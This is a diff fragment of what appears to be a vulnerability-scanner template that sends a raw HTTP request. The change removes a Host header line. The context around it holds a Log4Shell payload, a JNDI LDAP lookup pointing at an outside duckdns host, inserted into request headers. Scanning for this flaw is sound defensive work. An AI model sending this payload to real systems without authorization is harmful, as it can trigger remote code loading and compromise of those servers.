@@ -10,7 +10,6 @@ requests:
   - raw:
       - |+
         GET / HTTP/1.1
-        Host: {{BaseURL}}
         {{header}}: ${jndi:ldap://labdalab.duckdns.org:4567/gotcha}
     payloads:
       header:
